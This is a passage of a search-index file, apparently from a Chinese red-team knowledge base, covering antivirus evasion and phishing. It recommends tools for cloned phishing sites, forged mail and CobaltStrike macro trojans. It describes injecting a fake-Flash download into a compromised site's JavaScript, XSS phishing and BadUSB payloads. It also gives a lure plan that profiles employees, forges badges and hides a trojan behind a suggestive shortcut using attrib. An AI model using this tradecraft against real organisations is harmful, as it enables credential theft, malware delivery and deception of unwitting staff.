\u7b49\u7b49\u7b49.... \u5de5\u5177\u6df7\u6dc6,\u9488\u5bf9\u5404\u79cd\u8bed\u8a00\u7684\u4e13\u4e1a\u6df7\u6dc6\u5de5\u5177 [ \u6709\u5546\u4e1a\u7248 ] ... \u52a0\u58f3: \u4e00\u4e9b\u5e38\u7528\u516c\u5f00\u58f3\u7684\u5b9e\u9645\u6548\u679c\u53ef\u80fd\u5e76\u4e0d\u662f\u592a\u597d [ \u4e5f\u6709\u5546\u4e1a\u58f3 ] \u6700\u597d\u7684\u65b9\u5f0f\u8fd8\u662f\u5c1d\u8bd5\u81ea\u5df1\u5199\u58f3,\u5c31\u662f\u6210\u672c\u8f83\u9ad8 ... \u52a8\u6001 \u53cd\u5c04 shellcode \u5185\u5b58\u52a0\u89e3\u5bc6\u6267\u884c ( \u5bf9\u4e8e\u73b0\u5728\u7684\u67d0\u4e9b\u6740\u8f6f\u6765\u8bb2,\u53ef\u80fd\u5e76\u6ca1\u4ec0\u4e48\u5375\u7528,\u522b\u4eba\u62e6\u7684\u57fa\u672c\u90fd\u662f\u4f60\u7684\u6700\u7ec8\u8c03\u7528 ) \u767d\u5229\u7528 ...... \u6ce8: \u7406\u8bba\u4e0a, \u8fd9\u4e9b\u5e94\u8be5\u4e5f\u6ca1\u6709\u4ec0\u4e48\u975e\u5e38\u901a\u7528\u7684\u65b9\u6cd5 \u5927\u591a\u8fd8\u662f\u4e8b\u5148\u9488\u5bf9\u7279\u5b9a\u7684\u6740\u8f6f\u9488\u5bf9\u6027\u7684\u4e0d\u505c\u8c03\u8bd5\u5206\u6790\u51fa\u5b83\u5230\u5e95\u600e\u4e48\u62e6,\u600e\u4e48\u67e5\u7684,\u7136\u540e\u518d\u9488\u5bf9\u6027\u7684\u5bf9\u75c7\u4e0b\u836f \u6d41\u91cf: \u57df\u524d\u7f6e[\u5229\u7528\u5927\u5382cdn] DNS\u52a0\u5bc6\u96a7\u9053 \u7b2c\u4e09\u65b9\u516c\u5171\u90ae\u7bb1\u4e0a\u7ebf \u7b2c\u4e09\u65b9\u7f51\u76d8\u4e0a\u7ebf \u7b2c\u4e09\u65b9\u793e\u4ea4\u7f51\u7ad9\u4e0a\u7ebf \u7b2c\u4e09\u65b9\u533f\u540d\u793e\u4ea4\u5de5\u5177\u4e0a\u7ebf[eg: tg\u673a\u5668\u4eba,tor...] https://chaceshadow.github.io/","title":"0x15 \u514d\u6740 \u53ca \u5404\u7c7b\u9632\u706b\u5899\u5bf9\u6297"},{"location":"redteam/%E9%92%93%E9%B1%BC/","text":"\u9493\u9c7c\u653b\u51fb\u5206\u4e3a\uff1a 1\u3001\u9493\u9c7c\u90ae\u4ef6 2\u3001wifi\u9493\u9c7c 3\u3001\u9493\u9c7c\u4e8c\u7ef4\u7801 4\u3001\u4f2a\u57fa\u7ad9 5\u3001\u9c7c\u53c9\u5f0f\u9493\u9c7c\u653b\u51fb 6\u3001\u6c34\u5751\u9493\u9c7c\u653b\u51fb 7\u3001U\u76d8\u9493\u9c7c\u653b\u51fb \u653b\u51fb\u624b\u6cd5\u5206\u4e3a\uff1a 1\u3001\u901a\u8fc7\u6f0f\u6d1e\u89e6\u53d1 \u64cd\u4f5c\u7cfb\u7edf\u6f0f\u6d1e\uff08\u6728\u9a6c\u690d\u5165\uff09 \u5e94\u7528\u7a0b\u5e8f\u53ca\u6d4f\u89c8\u5668\u6f0f\u6d1e \u76ee\u6807web\u670d\u52a1\u5668\u6f0f\u6d1e ... 2\u3001\u5229\u7528\u793e\u5de5\u7684\u65b9\u5f0f\uff08\u975e\u6f0f\u6d1e\u89e6\u53d1\uff09 \u5185\u5bb9\u4eff\u5192\uff08\u7535\u5546/\u91d1\u878d\u7ad9\u70b9\u3001\u57df\u540d\uff09 \u865a\u5047\u8bf1\u9a97\uff08\u90ae\u4ef6\u3001\u77ed\u4fe1\u3001\u4e2d\u5956\u3001\u641c\u7d22\u5f15\u64ce\uff09 \u793e\u4f1a\u5de5\u7a0b\u5b66 0x01 \u90ae\u4ef6\u9493\u9c7c \u00b6 \u4e00\u3001\u7a83\u53d6\u53e3\u4ee4\u7c7b \u00b6 \u7528\u4f2a\u88c5\u7684\u7535\u90ae\uff0c\u6b3a\u9a97\u6536\u4ef6\u4eba\u5c06\u8d26\u53f7\u3001\u53e3\u4ee4\u7b49\u4fe1\u606f\u56de\u590d\u7ed9\u6307\u5b9a\u7684\u63a5\u6536\u8005 \uff1b\u6216\u5f15\u5bfc\u6536\u4ef6\u4eba\u8fde\u63a5\u5230\u7279\u5236\u7684\u7f51\u9875\uff0c\u8fd9\u4e9b\u7f51\u9875\u901a\u5e38\u4f1a\u4f2a\u88c5\u6210\u548c\u771f\u5b9e\u7f51\u7ad9\u4e00 \u6837\uff0c\u5982\u94f6\u884c\u6216\u7406\u8d22\u7684\u7f51\u9875\uff0c\u4ee4\u767b\u5f55\u8005\u4fe1\u4ee5\u4e3a\u771f\uff0c\u8f93\u5165\u4fe1\u7528\u5361\u6216\u94f6\u884c\u5361\u53f7\u7801 \u3001\u8d26\u6237\u540d\u79f0\u53ca\u5bc6\u7801\u7b49\u800c\u88ab\u76d7\u53d6\u3002 \u7b56\u7565\u8bf4\u660e\uff1a 1\u3001\u642d\u5efa\u9493\u9c7c\u7ad9\u9700\u8003\u8651\u65f6\u95f4\u6210\u672c\u548c\u961f\u4f0d\u7684\u4ee3\u7801\u529f\u5e95\u7b49\u5404\u79cd\u56e0\u7d20\uff0c\u4f7f\u7528Spoof Web\u548csetoolkit\u901f\u5ea6\u6700\u5feb\uff0chttrack\u4eff\u771f\u5ea6\u6700\u9ad8\uff0c\u4f46\u662f\u8981\u8bb0\u5f55\u8bbf\u95ee\u8005\u7684\u8f93\u5165 \u9700\u8981\u4fee\u6539\u76f8\u5173\u6587\u4ef6\uff0c\u6210\u672c\u8f83\u9ad8\u3002 2\u3001\u901a\u8fc7Swaks\u4f2a\u9020\u90ae\u4ef6\uff08\u6216\u5176\u4ed6\u65b9\u5f0f\uff09\u53d1\u9001\u793e\u5de5\u90ae\u4ef6\uff08\u6279\u91cf\u6216\u5b9a\u5411\uff09\u3002 3\u3001\u51e0\u4e2a\u91cd\u8981\u56e0\u7d20\uff1a\u4eff\u9020\u7684\u7ad9\u70b9\u76ee\u6807\u3001\u76ee\u6807\u4eba\u7fa4\u3001\u8bdd\u672f\u3002\u6f02\u4eae\u7684\u6218\u672f\u5236\u5b9a\u5f80 \u5f80\u6bd4\u6280\u672f\u70b9\u7684\u6289\u62e9\u66f4\u91cd\u8981\u3002\u4f8b\u598219\u5e74\u5e95\u5230\u73b0\u5728\u76db\u884c\u7684\u88f8\u804a\u8bc8\u9a97\u5957\u8def\uff0c\u901a\u8fc7 \u4eba\u6027\u7684\u5f31\u70b9\uff0c\u6548\u679c\u663e\u8457\u3002\u518d\u4f8b\u5982\u51e0\u4e2a\u6708\u524d\u7684\u67d0\u6b21\u6f14\u7ec3\uff0c\u67d0\u53f8\u961f\u4f0d\u901a\u8fc7\u53cd\u4ee3 \u9493\u9c7c\u7684\u624b\u6cd5\uff0c\u6210\u529f\u7684\u62ff\u5230\u4e86\u76ee\u6807\u7684\u7c7b\u4f3c\u4e91\u4e3b\u673a\u7ba1\u7406\u7cfb\u7edf\u7684web\u8d26\u53f7\u5bc6\u7801\uff0c\u63a5 \u7ba1\u4e00\u5806\u865a\u62df\u4e91\u4e3b\u673a\u3002 \u642d\u5efa\u9493\u9c7c\u7f51\u7ad9\u76f8\u5173\u53c2\u8003\uff1a 1\u3001\u4e00\u952e\u90e8\u7f72HTTPS\u9493\u9c7c\u7ad9 https://github.com/klionsec/SpoofWeb 2\u3001nginx\u505a\u53cd\u5411\u4ee3\u7406-\u9493\u9c7c https://www.cnblogs.com/R4v3n/articles/8460811.html 3\u3001\u514b\u9686\u7f51\u7ad9\u795e\u5668httrack https://github.com/xroche/httrack 4\u3001\u793e\u4f1a\u5de5\u7a0b\u5b66\u5de5\u7a0b\u5305 https://github.com/trustedsec/social-engineer-toolkit 5\u3001setoolkit\u7684\u5b89\u88c5\u4e0e\u4f7f\u7528 https://www.cnblogs.com/zhangb8042/articles/10910019.html 6\u3001flash\u7684\u9493\u9c7c\u9875 https://github.com/r00tSe7en/Fake-flash.cn \u90ae\u4ef6\u4f2a\u9020\u53c2\u8003\uff1a 1\u3001Swaks\u4f2a\u9020\u90ae\u4ef6 https://payloads.online/archivers/2019-05-09/1 2\u3001Swaks - Swiss Army Knife for SMTP http://www.jetmore.org/john/code/swaks/ 3\u3001CobaltStrike \u751f\u6210Office\u5b8f\u75c5\u6bd2\u8fdb\u884c\u9493\u9c7c\u653b\u51fb Office\u5b8f\u75c5\u6bd2\u6df7\u6dc6\u514d\u6740- EvilClippy CobaltStrike \u751f\u6210exe\u6728\u9a6c\u8fdb\u884c\u9493\u9c7c\u653b\u51fb\u514d\u6740\uff1a \u514d\u6740\u53ef\u4ee5\u7528 https://github.com/1y0n/AV_Evasion_Tool \u8fd8\u6ca1\u88ab\u548c\u8c10\u592a\u591a \u6df7\u6dc6\uff1a https://jishuin.proginn.com/p/763bfbd60aa3 CobaltStrike \u751f\u6210shellcode\u8fdb\u884c\u514d\u6740\u4e0a\u7ebf 4\u3001\u6c34\u5751\u653b\u51fb-Flash\u4f2a\u88c5 \u5047\u8bbe\u5df2\u7ecf\u62ff\u5230\u4e00\u53f0\u5185\u7f51web\u5728\u7528\u670d\u52a1\u5668\u7cfb\u7edf\u6743\u9650\uff0c\u4e0a\u4f20\u4f2a\u88c5\u514d\u6740\u9a6c\u5b50\u548c\u7279\u5b9ajs\uff0c\u5047\u8bbe\u627e\u5230\u7ad9\u70b9all.js\u6587\u4ef6\uff0c\u70b9\u51fb\u7f16\u8f91\u4fee\u6539 document.write(\" \");\u6b63\u5e38\u4eba\u4f1a\u53bb\u70b9\u51fb\u4e0b\u8f7d\u6700\u65b0\u7248\u672c\uff0c\u6b64\u65f6\u4f1a\u4e0b\u8f7d\u4f2a\u88c5\u7684\u514d\u6740\u9a6c\u5b50\uff0c\u7136\u540e\u2026\u2026 https://github.com/r00tSe7en/Flash-Pop \u5b9e\u4f8b\u53c2\u8003\uff1a 1\u3001\u8bb0\u4e00\u6b21\u771f\u5b9e\u7684\u90ae\u4ef6\u9493\u9c7c\u6f14\u7ec3 https://xz.aliyun.com/t/5412 \u4e8c\u3001\u9644\u4ef6\u643a\u9a6c\u7c7b \u00b6 \u7528\u4f2a\u88c5\u7684\u7535\u90ae\uff08\u4e0d\u9650\u4e8e\u5e38\u89c1\u90ae\u4ef6\uff0c\u4e00\u4e9b\u5185\u90e8\u7684oa\uff0cerp\uff0c\u6216\u5176\u4ed6\u4f9b\u5458\u5de5 \u4f7f\u7528\u4ea4\u6d41\u5e26\u9644\u4ef6\u529f\u80fd\u7684\u7cfb\u7edf\u4ea6\u53ef\uff09\uff0c\u9644\u4ef6\u643a\u5e26excel\u5b8f\u75c5\u6bd2\uff0c\u6216\u5feb\u6377\u65b9\u5f0f\u7c7b \u6728\u9a6c\uff0c\u4ea6\u6216\u6346\u7ed1\u5728\u6b63\u5e38\u8f6f\u4ef6\u4e2d\u7684\u6728\u9a6c\u7b49\uff0c\u53d1\u9001\u7ed9\u76ee\u6807\uff0c\u7b56\u7565\u548c\u7a83\u53d6\u53e3\u4ee4\u7c7b \u4f3c\u3002\u4e0d\u63a8\u8350excel\u65b9\u5f0f\uff0cwps\u5360\u636e\u4e86\u56fd\u4eba\u5927\u90e8\u5206\u7cfb\u7edf\u3002 \u7ecf\u9a8c\u5206\u4eab\uff1a \u5404\u7c7bOA\u7cfb\u7edf\u7684\u6f0f\u6d1e\u90fd\u88ab\u4fee\u8865\u65e0\u6cd5getshell\u7684\u60c5\u51b5\u4e0b\uff0c\u4e00\u5b9a\u4e0d\u8981\u653e\u5f03\u5b83 \uff0c\u4f8b\u5982seeyon\uff0c\u4e00\u4e2a\u5f31\u53e3\u4ee4\u8fdbOA\uff0c\u518d\u63d0\u53d6\u5176\u4ed6\u7528\u6237\u7684username\u518d\u8dd1\u4e00\u53d1 \u5f31\u53e3\u4ee4\uff0c\u901a\u8fc7\u6536\u96c6\u7528\u6237\u5e73\u65f6\u5de5\u4f5c\u6765\u5f80\u4fe1\u4ef6\uff0c\u9488\u5bf9\u5176\u4ed6\u4eba\u4e0e\u8be5\u8d26\u53f7\u5e73\u65f6\u7684\u5de5 \u4f5c\u5185\u5bb9\u5236\u5b9a\u8bdd\u672f\uff0c\u5b9a\u5411\u9493\u9c7c\u3002\u4f8b\u5982\u5728\u67d0\u6b21\u7684\u9879\u76ee\u4e2d\uff0c\u6211\u4eec\u901a\u8fc7\u4e00\u4e2a\u666e\u901a\u5458 \u5de5\u5f31\u53e3\u4ee4\u8fdb\u5165\u4e86\u8be5\u53f8\u4e00\u4e2a\u5ba2\u670d\u7cfb\u7edf\uff0c\u901a\u8fc7\u4fe1\u606f\u6536\u96c6\u53d1\u73b0\u4e0a\u9762\u6709\u7f51\u7ba1\u7528\u6237\u548c \u666e\u901a\u5ba2\u670d\u4eba\u5458\uff0c\u901a\u8fc7\u9644\u4ef6\u643a\u9a6c\u7684\u65b9\u5f0f\u6210\u529f\u9493\u5230\u7ba1\u7406\u5458\uff0c\u5728\u540e\u7eed\u7684\u6df1\u5165\u4e2d\u5c31 \u65b9\u4fbf\u591a\u4e86\u3002 \u514d\u6740\u63a8\u8350\uff1a https://github.com/Rvn0xsy/BadCode https://github.com/1y0n/AV_Evasion_Tool \u6346\u7ed1\u63a8\u8350\uff1a https://github.com/TheKingOfDuck/MatryoshkaDollTool \u5b57\u5178\u63a8\u8350\uff1a https://github.com/sry309/SuperWordlist https://github.com/cwkiller/Pentest_Dic https://github.com/TheKingOfDuck/fuzzDicts \u7cbe\u5f69\u7206\u7834\u6848\u4f8b\uff1a \u4e00\u6b21\u7a0d\u663e\u66f2\u6298\u7684\u7206\u7834\u7ecf\u5386 https://www.cnblogs.com/cwkiller/p/12741086.html \u5176\u4ed6\u63a8\u8350\uff1a \u9c7c\u53c9\u653b\u51fb-\u70ae\u8f70\u9a6c\u7684\u5236\u4f5c https://mp.weixin.qq.com/s/3GLmtGoP-rG1nBBSw_KxkQ \u53d1\u4ef6\u5185\u5bb9\uff1a 1\u3001\u6295\u8bc9\u90ae\u4ef6 2\u3001\u9879\u76ee\u5408\u4f5c 3\u3001\u8d22\u52a1\u901a\u77e5 4\u3001\u6c42\u804c\u90ae\u4ef6 5\u3001\u5b98\u65b9\u901a\u544a 6\u3001\u5185\u90ae\u5185\u5bb9\u56de\u590d 0x02 XSS-Phishing \u00b6 \u4e00\u3001\u7b80\u8ff0 \u00b6 XSS\u653b\u51fb\u901a\u5e38\u6307\u7684\u662f\u901a\u8fc7\u5229\u7528\u7f51\u9875\u5f00\u53d1\u65f6\u7559\u4e0b\u7684\u6f0f\u6d1e\uff0c\u901a\u8fc7\u5de7\u5999\u7684\u65b9 \u6cd5\u6ce8\u5165\u6076\u610f\u6307\u4ee4\u4ee3\u7801\u5230\u7f51\u9875\uff0c\u4f7f\u7528\u6237\u52a0\u8f7d\u5e76\u6267\u884c\u653b\u51fb\u8005\u6076\u610f\u5236\u9020\u7684\u7f51\u9875\u7a0b \u5e8f\u3002\u8fd9\u4e9b\u6076\u610f\u7f51\u9875\u7a0b\u5e8f\u901a\u5e38\u662fJavaScript\uff0c\u4f46\u5b9e\u9645\u4e0a\u4e5f\u53ef\u4ee5\u5305\u62ecJava\uff0cVB Script\uff0cActiveX\uff0cFlash\u6216\u8005\u751a\u81f3\u662f\u666e\u901a\u7684HTML\u3002\u653b\u51fb\u6210\u529f\u540e\uff0c\u653b\u51fb\u8005\u53ef \u80fd\u5f97\u5230\u66f4\u9ad8\u7684\u6743\u9650\uff08\u5982\u6267\u884c\u4e00\u4e9b\u64cd\u4f5c\uff09\u3001\u79c1\u5bc6\u7f51\u9875\u5185\u5bb9\u3001\u4f1a\u8bdd\u548ccookie\u7b49 \u5404\u79cd\u5185\u5bb9\u3002 \u4e8c\u3001XSS\u9493\u9c7c \u00b6 \u5728hw\u9700\u6c42\u9762\u524d\uff0c\u6ca1\u67090day\uff0c\u627e\u4e0d\u5230\u5165\u53e3\u70b9\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u5b89\u6392\u4e00\u540d\u64c5 \u4e8exss\u6316\u6398\u7684\u961f\u5458\u5229\u7528\u6b64\u79cd\u65b9\u5f0f\u3002 \u4f7f\u7528xss\u5f39\u7a97\u63d0\u793a\u9493\u9c7c\u7684\u65f6\u5019\u9762\u4e34\u7684\u95ee\u9898\uff0c\u5982\u679c\u9c7c\u513f\u5df2\u4e0a\u7ebf\uff0c\u8bbf\u95ee\u8005\u8fd8\u4f1a\u6301 \u7eed\u4e0d\u65ad\u7684\u5f39\u7a97\uff0c\u5bb9\u6613\u5f15\u8d77\u9c7c\u513f\u6000\u7591\uff0c \u6743\u9650\u8bf4\u6ca1\u5c31\u6ca1\u4e86\uff0c\u8fd9\u5e76\u4e0d\u662f\u6211\u4eec\u5e0c\u671b\u770b\u5230\u7684\u7ed3\u679c\u3002 \u53c2\u8003\u6587\u7ae0 XSS\u5b9e\u4f8b\u53ca\u6316\u6398\u65b9\u6cd5 https://www.yuque.com/broken5/blog/vukwsh \u7ea2\u961f\u653b\u9632\u7cfb\u5217\u4e4b\u82b1\u5f0f\u9c7c\u7aff\u9493\u9c7c\u7bc7 https://xz.aliyun.com/t/7958 \u53c2\u8003\u5de5\u5177 XSS-Phishing https://github.com/timwhitez/XSS-Phishing XSS-Fishing2-CS https://github.com/TheKingOfDuck/XSS-Fishing2-CS \u7b56\u7565\u8865\u5145\uff1a\u6b64\u7c7b\u624b\u6cd5\u4e0d\u4ec5\u53ef\u4ee5\u8fd0\u7528\u4e8e\u5728\u6316\u5230xss\u65f6\u4f7f\u7528\uff0c\u5728\u6709webshell\u7684\u60c5 \u51b5\u4e0b\uff0c\u8fd8\u53ef\u4ee5\u4fee\u6539\u76f8\u5173\u4ee3\u7801\uff0c\u5d4c\u5165js\u6587\u4ef6\u8fdb\u884c\u5bf9\u4e2a\u4ebaPC\u7684\u9493\u9c7c\uff0c\u4f8b\u5982\u67d0\u7c7b \u6709\u8fd0\u7ef4\u7ef4\u62a4\u7684\u7ad9\u70b9\uff0c\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\u9493\u8fd0\u7ef4PC\uff0c\u8fd0\u7ef4PC\u4e0a\u7684\u4e1c\u897f\u53ef\u6bd4\u81ea\u5df1\u6253 server\u673a\u6162\u6162\u63a2\u7d22\u6765\u5f97\u8fc5\u901f\u900f\u5f7b\u3002 0x03 BadUsb \u00b6 \u4e00\u3001\u7b80\u8ff0 \u00b6 BadUSB\u662f\u5229\u7528\u4f2a\u9020HID\u8bbe\u5907\u6267\u884c\u653b\u51fb\u8f7d\u8377\u7684\u4e00\u79cd\u653b\u51fb\u65b9\u5f0f\u3002HID\u8bbe\u5907\u901a\u5e38 \u6307\u7684\u5c31\u662f\u952e\u76d8\u9f20\u6807\u7b49\u4e0e\u4eba\u4ea4\u4e92\u7684\u8bbe\u5907\uff0c\u7528\u6237\u63d2\u5165BadUSB\uff0c\u5c31\u4f1a\u81ea\u52a8\u6267\u884c \u9884\u7f6e\u5728\u56fa\u4ef6\u4e2d\u7684\u6076\u610f\u4ee3\u7801\u3002 Bad\ufffeUsb\u63d2\u5165\u540e\uff0c\u4f1a\u6a21\u62df\u952e\u76d8\u9f20\u6807\u5bf9\u7535\u8111\u8fdb\u884c\u64cd\u4f5c\uff0c\u901a\u8fc7\u8fd9\u4e9b\u64cd\u4f5c\u6253\u5f00\u7535\u8111\u7684\u547d \u4ee4\u7ec8\u7aef\uff0c\u5e76\u6267\u884c\u4e00\u6761\u547d\u4ee4\uff0c\u8fd9\u6761\u547d\u4ee4\u5c06\u4ece\u6307\u5b9a\u7f51\u5740\u4e0b\u8f7d\u5176\u4ed6\u4ee3\u7801\u5e76\u4e8e\u540e\u53f0 \u9759\u9ed8\u8fd0\u884c\u3002\u8fd9\u4e9b\u4ee3\u7801\u529f\u80fd\u5305\u62ec\uff1a\u7a83\u53d6\u4fe1\u606f\u3001\u53cd\u5f39shell\u3001\u53d1\u9001\u90ae\u4ef6\u7b49\uff0c\u4ece\u800c \u5b9e\u73b0\u63a7\u5236\u76ee\u6807\u673a\u6216\u8005\u7a83\u53d6\u4fe1\u606f\u7684\u76ee\u7684\u3002 \u4e8c\u3001\u64cd\u4f5c \u00b6 \u8be6\u7ec6\u7684\u5236\u4f5c\u64cd\u4f5c\u8fc7\u7a0b\u4e0d\u518d\u7d2f\u8ff0\uff0c\u53c2\u8003\u4ee5\u4e0b\u6587\u7ae0\u3002 BadUSB\u7b80\u5355\u514d\u6740\u4e00\u79d2\u4e0a\u7ebfCobaltStrike https://mp.weixin.qq.com/s/UROx1fJOmMVbmH_-UasFEQ Badusb\u521d\u8bc6 https://xz.aliyun.com/t/6435 BasUSB\u5b9e\u73b0\u540e\u53f0\u9759\u9ed8\u6267\u884c\u4e0a\u7ebfCobaltStrike https://mp.weixin.qq.com/s/pH9hcKGQHIRMxU3uDN3JUw \u7b56\u7565\u8865\u5145 1\u3001\u6478\u7d22\u5458\u5de5\u4fe1\u606f\uff0c\u4f8b\u5982\u67d0\u4e4e\uff0c\u67d0\u76f4\u8058\uff0c\u5c3d\u4e00\u5207\u4fe1\u606f\u6536\u96c6\u624b\u6bb5\uff0c\u91c7\u96c6\u5458\u5de5\u4fe1 \u606f\uff08\u5973\u6027\u5458\u5de5\u4e3a\u5b9c\uff09\u3002 2\u3001\u67d0\u5b9d\u641c\u7d22\u8d2d\u4e70\u8be5\u53f8\u5458\u5de5\u5de5\u724c\uff0c\u5e76\u5236\u4f5c\u3002 3\u3001\u5236\u4f5cbadusb\uff0c\u5e76\u5c06U\u76d8\u8d34\u4e0a\u4e00\u4e9b\u7b26\u5408\u5973\u6027\u5ba1\u7f8e\u7684\u8d34\u7eb8\u4e4b\u7c7b\uff0c\u5c06\u5176\u6302\u8f7d\u5de5 \u724c\u4e0a\u3002 4\u3001\u4e3a\u4e86\u4fdd\u9669\u8d77\u89c1\uff0c\u8bbe\u7f6e\u7b2c\u4e8c\u4e2a\u5907\u7528\u65b9\u6848\uff0c\u4f8b\u5982\uff0c\u5229\u7528\u5feb\u6377\u65b9\u5f0f\u7684\u624b\u6cd5\uff0c\u627e \u4e00\u5f20\u7537\u5973\u66a7\u6627\u7684\u56fe\u7247\u7528\u6765\u5236\u4f5c\u5feb\u6377\u65b9\u5f0f\u7684\u56fe\u6807\uff0c\u540d\u5b57\u53d6\u540d\u4e3a\u201c\u521d\u590f\u4e4b\u591c.mp4 \u201d\uff0c\u5c06\u8be5\u6587\u4ef6\u653e\u5728\u540d\u4e3a\u201c\u751c\u871c\u65f6\u523b\u201d\u6587\u4ef6\u5939\u4e0b\uff0c\u6587\u4ef6\u5939\u4e0b\u518d\u653e\u51e0\u5f20\u7f51\u7edc\u201c\u8336\u56fe\u201d\uff0c \u4e0d\u5e26\u8138\u7684\u90a3\u79cd\uff0c\u518d\u8bbe\u7f6e\u4e00\u4e2a\u9690\u85cf\u5c5e\u6027\u7684\u6587\u4ef6\u5939\uff0c\u91cc\u9762\u5b58\u653e\u81ea\u5df1\u7684\u514d\u6740\u9a6c\u3002 Attrib +s +a +h +r \u547d\u4ee4\u4ecb\u7ecd\uff1a \u663e\u793a\u6216\u66f4\u6539\u6587\u4ef6\u5c5e\u6027ATTRIB[+R|-R][+A|-A][+S|-S][+H|- H][[drive:][path]filename][/S[/D]]+\u8bbe\u7f6e\u5c5e\u6027\uff1b- \u6e05\u9664\u5c5e\u6027\uff1bR\u53ea\u8bfb\u6587\u4ef6\u5c5e\u6027\uff1bA\u5b58\u6863\u6587\u4ef6\u5c5e\u6027\uff1bS\u7cfb\u7edf\u6587\u4ef6\u5c5e\u6027\uff1bH\u9690\u85cf\u6587\u4ef6\u5c5e\u6027\uff1b \u73b0\u5728\uff0c\u6211\u4eec\u628a\u8fd9\u4e2aU\u76d8+\u5de5\u724c\u4f2a\u9020\u6210\u4e86\u67d0\u4e00\u4e2a\u5973\u6027\u5458\u5de5\u7684\u7269\u54c1\uff0c\u5e76\u5728\u5176\u4e2d\u5b58 \u653e\u4e86\u4e00\u4e9b\u4ee4\u4eba\u611f\u5174\u8da3\u7684\u4e1c\u897f\uff0c\u60f3\u8c61\u4e00\u4e0b\uff0c\u5982\u679c\u5c06\u5176\u6295\u653e\u5728\u8be5\u53f8\u67d0\u4e00\u4e2a\u5730\u65b9 \uff0c\u88ab\u5458\u5de5\u62fe\u9057\uff0c\u4f1a\u51fa\u73b0\u4ec0\u4e48\u6837\u7684\u60c5\u51b5\u3002\u3002\u3002 \u53c2\u8003\u94fe\u63a5 \u65b0\u578b\u8fdc\u63a7\u6728\u9a6c\u4e0a\u6f14\u79fb\u5f62\u6362\u5f71\u5927\u6cd5 https://www.freebuf.com/articles/system/138164.html Windows\u768412\u79cd\u5feb\u6377\u65b9\u5f0f https://www.cnblogs.com/bkclover/p/4228441.html \u7ea2\u961f\u6d3b\u52a8\u4e4bLnk\u6837\u672c\u8f7d\u8377\u7bc7 https://mp.weixin.qq.com/s/ZbtGJAT-SyZ50LRNOCg14w 0x04 \u5c0f\u6280\u5de7\u6f14\u793a \u00b6 \u4e00\u3001\u9644\u4ef6\u643a\u9a6c \u4e8c\u3001\u6346\u7ed1\u643a\u9a6c \u8bf4\u660e\uff1a\u4ee5\u4e0a\u6240\u6f14\u793a\u7684\u4e24\u79cd\u5b9e\u73b0\u5747\u662f\u4ece\u672c\u6587\u6240\u5217\u4e3e\u7684\u5185\u5bb9\u7ecf\u8fc7\u7ec4\u5408\u4fee\u6539\u6d4b\u8bd5 \u800c\u6210\uff0c\u4e0d\u5177\u6709\u591a\u5c11\u6280\u672f\u542b\u91cf\u3002 0x05 \u6700\u540e \u00b6 \u793e \u5de5 \u51e0 \u4e2a \u57fa \u7840 \u70b9 \uff1a 1 \u3001 \u4fe1 \u606f \u6536 \u96c6 2 \u3001 \u7ed8 \u5236 \u4eba \u7269 \u753b \u50cf 3\u3001\u6307\u5b9a\u6218\u672f\u3002\u5728\u5b9e\u6218\u4e2d\u5e94\u5c06\u793e\u5de5\u9493\u9c7c\u878d\u5165\u6e17\u900f\u7684\u5404\u4e2a\u73af\u8282\u3002\u9ad8\u8d28\u91cf\u7684\u9488\u5bf9 \u67d0\u7c7b\u4e2a\u4f53\u9493\u9c7c\u5f80\u5f80\u6bd4\u6279\u91cf\u6d77\u9493\u7684\u6548\u679c\u6765\u7684\u66f4\u51fa\u8272\u3002 \u4e00\u7bc7\u7cbe\u5f69\u7684\u5b9e\u4f8b\u793e\u5de5 \u53cd\u8bc8\u6848\u4f8b|\u8bc8\u9a97\u56e2\u4f19\u5192\u5145\u9886\u5bfc\u5f00\u53e3\u5c31\u898198w https://mp.weixin.qq.com/s/KL6O6fqeKWue81VZTiYAFA \u9644\u4e0a\u53f2\u4e0a\u6700\u52a8\u542c\u6700\u7ecf\u5178\u7684\u539f\u7248\u97f3\u9891\uff1a\u6709\u4e3b\u673a\u4e0a\u7ebf\u8bf7\u6ce8\u610f \u7cbe\u9009\u7559\u8a00 \u7528\u6237\u8bbe\u7f6e\u4e0d\u4e0b\u8f7d\u8bc4\u8bba","title":"\u9493\u9c7c"},{"location":"redteam/%E9%92%93%E9%B1%BC/#0x01","text":"","title":"0x01 \u90ae\u4ef6\u9493\u9c7c"},{"location":"redteam/%E9%92%93%E9%B1%BC/#_1","text":"\u7528\u4f2a\u88c5\u7684\u7535\u90ae\uff0c\u6b3a\u9a97\u6536\u4ef6\u4eba\u5c06\u8d26\u53f7\u3001\u53e3\u4ee4\u7b49\u4fe1\u606f\u56de\u590d\u7ed9\u6307\u5b9a\u7684\u63a5\u6536\u8005 \uff1b\u6216\u5f15\u5bfc\u6536\u4ef6\u4eba\u8fde\u63a5\u5230\u7279\u5236\u7684\u7f51\u9875\uff0c\u8fd9\u4e9b\u7f51\u9875\u901a\u5e38\u4f1a\u4f2a\u88c5\u6210\u548c\u771f\u5b9e\u7f51\u7ad9\u4e00 \u6837\uff0c\u5982\u94f6\u884c\u6216\u7406\u8d22\u7684\u7f51\u9875\uff0c\u4ee4\u767b\u5f55\u8005\u4fe1\u4ee5\u4e3a\u771f\uff0c\u8f93\u5165\u4fe1\u7528\u5361\u6216\u94f6\u884c\u5361\u53f7\u7801 \u3001\u8d26\u6237\u540d\u79f0\u53ca\u5bc6\u7801\u7b49\u800c\u88ab\u76d7\u53d6\u3002 \u7b56\u7565\u8bf4\u660e\uff1a 1\u3001\u642d\u5efa\u9493\u9c7c\u7ad9\u9700\u8003\u8651\u65f6\u95f4\u6210\u672c\u548c\u961f\u4f0d\u7684\u4ee3\u7801\u529f\u5e95\u7b49\u5404\u79cd\u56e0\u7d20\uff0c\u4f7f\u7528Spoof Web\u548csetoolkit\u901f\u5ea6\u6700\u5feb\uff0chttrack\u4eff\u771f\u5ea6\u6700\u9ad8\uff0c\u4f46\u662f\u8981\u8bb0\u5f55\u8bbf\u95ee\u8005\u7684\u8f93\u5165 \u9700\u8981\u4fee\u6539\u76f8\u5173\u6587\u4ef6\uff0c\u6210\u672c\u8f83\u9ad8\u3002 2\u3001\u901a\u8fc7Swaks\u4f2a\u9020\u90ae\u4ef6\uff08\u6216\u5176\u4ed6\u65b9\u5f0f\uff09\u53d1\u9001\u793e\u5de5\u90ae\u4ef6\uff08\u6279\u91cf\u6216\u5b9a\u5411\uff09\u3002 